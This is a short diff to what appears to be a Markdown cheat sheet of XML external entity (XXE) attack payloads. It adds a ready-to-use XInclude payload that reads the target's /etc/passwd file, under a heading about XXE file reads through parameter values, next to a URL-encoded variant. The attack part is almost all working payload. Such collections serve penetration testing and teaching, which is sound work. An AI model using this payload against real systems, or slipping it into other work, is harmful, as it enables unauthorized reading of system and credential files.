@@ -519,6 +519,11 @@ If the output of the `win.ini` file on the target returns the response message, 
 ```
 
 ### XXE file read via XInclude payload as parameter value 
+#### `payload`
+
+```xml
+<akrech xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></akrech>
+```
 
 #### `url encoded payload`
 ```
